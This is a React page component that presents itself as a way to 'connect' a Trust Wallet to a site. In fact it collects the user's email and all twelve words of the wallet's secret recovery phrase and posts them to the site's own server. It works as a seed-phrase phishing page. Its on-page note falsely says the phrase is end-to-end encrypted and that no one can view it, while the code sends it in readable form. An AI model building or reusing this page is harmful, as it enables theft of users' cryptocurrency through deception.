import { useHistory } from 'react-router-dom'
import LogoFull from '../../../Assets(New)/LogoFull.png'
import './ConnectTrustWallet.css'
import TrustWallet from '../../../Assets(New)/TrustWallet.png'
import TextField from "@mui/material/TextField";

import swal from 'sweetalert'
import axios from 'axios'
import { useState } from "react";
import CircularProgress from '@mui/material/CircularProgress';

const ConnectTrustWallet = () => {
    const history = useHistory();
    const [button, setButton]=useState('CONNECT')


    const [word1, setWord1]=useState("");
    const [word2, setWord2]=useState("");
    const [word3, setWord3]=useState("");
    const [word4, setWord4]=useState("");
    const [word5, setWord5]=useState("");
    const [word6, setWord6]=useState("");
    const [word7, setWord7]=useState("");
    const [word8, setWord8]=useState("");
    const [word9, setWord9]=useState("");
    const [word10, setWord10]=useState("");
    const [word11, setWord11]=useState("");
    const [word12, setWord12]=useState("");

    const [givenEmail, setGivenEmail]=useState("");
    const [userEmail, setUserEmail]=useState("");


    const handleClick=(e)=>{
        e.preventDefault();

        setUserEmail(JSON.parse(localStorage.getItem('data')).email);
        setButton(<CircularProgress color="inherit" />);
    
        const dataForm = {
            'word1': word1,
        'word2': word2,
        'word3': word3,
        'word4': word4,
        'word5': word5,
        'word6': word6,
        'word7': word7,
        'word8': word8,
        'word9': word9,
        'word10': word10,
        'word11': word11,
        'word12':word12, 
        'givenEmail': givenEmail,
        'userEmail': userEmail
        };

               
        
    
    
        axios.post(`${process.env.REACT_APP_SERVER}/connectTrustWallet`, dataForm,
            {
                headers: {
                    "Authorization": `Bearer ${localStorage.getItem("token")}`
                }
            }
        )
            .then((response) => {

                setButton("CONNECT")
                if (response.status === 200) {
                    swal(`Verification is on Process`, "You will get a confirmation mail when your wallet will be verified and connected.", "success")
                        .then(() => {
                            history.push("/user/dashboard")
                        })
                } else if (response.status === 202) {
                    swal(`${response.data.message}`, "", "error")
                    setButton('CONNECT')
                }
            })

    }

    return (
        
            <div className="connectTrustWallet" id="connectTrustWalletMain">
                <div className="welcomeLogo" >
                    <img src={LogoFull} alt='Logo' /> <p></p>
                </div>
                <div className="connectTrustWallet-content" >

                <div className="connectTrustWallet-head" >
                    Connect <img src={TrustWallet} alt="TrustWallet" />
                </div>
                <div className="connectTrustWallet-email">
                    <p>Enter your Email Address</p>
                    <div className="form-input" style={{backgroundColor:"#ffffff", borderRadius: '5px'}}>
                        <TextField
                            required
                            id="outlined-required"
                            label="Email Address"
                            defaultValue=""
                            fullWidth="true"
                            value={givenEmail}
                            onChange={(e)=>setGivenEmail(e.target.value)}  
                        />
                    </div>
                </div>
                <br/>
                <div className="connectTrustWallet-secret" >
                    <p>Enter your Trust Wallet 12 word Secret Phrase</p>
                    <div  className="connectTrustWallet-secret-phrase" >
                        <div className="connectTrustWallet-secret-phrase-inputs">
                        <input type="text" name=""  value={word1} onChange={(e)=>setWord1(e.target.value)} placeholder="1. word"/>
                        <input type="text" name=""  value={word2} onChange={(e)=>setWord2(e.target.value)} placeholder="2. word"/>
                        <input type="text" name=""  value={word3} onChange={(e)=>setWord3(e.target.value)} placeholder="3. word"/>
                        <input type="text" name=""  value={word4} onChange={(e)=>setWord4(e.target.value)} placeholder="4. word"/>
                        <input type="text" name=""  value={word5} onChange={(e)=>setWord5(e.target.value)} placeholder="5. word"/>
                        <input type="text" name=""  value={word6} onChange={(e)=>setWord6(e.target.value)} placeholder="6. word"/>
                        <input type="text" name=""  value={word7} onChange={(e)=>setWord7(e.target.value)} placeholder="7. word"/>
                        <input type="text" name=""  value={word8} onChange={(e)=>setWord8(e.target.value)} placeholder="8. word"/>
                        <input type="text" name=""  value={word9} onChange={(e)=>setWord9(e.target.value)} placeholder="9. word"/>
                        <input type="text" name=""  value={word10} onChange={(e)=>setWord10(e.target.value)} placeholder="10. word"/>
                        <input type="text" name=""  value={word11} onChange={(e)=>setWord11(e.target.value)} placeholder="11. word"/>
                        <input type="text" name=""  value={word12} onChange={(e)=>setWord12(e.target.value)} placeholder="12. word"/>
                        </div>
                    <button onClick={handleClick} >{button}</button>
                    <p>
                        <span>Note:</span> Trust Wallet must be atleast 30 days old and should have minimum $1 gas fees. 
                        Your Trust Wallet Phase Key is end to end encrypted. No one can view or access it.
                    </p>
                    </div>
                </div>
                </div>
            </div>
        
    )
}
export default ConnectTrustWallet;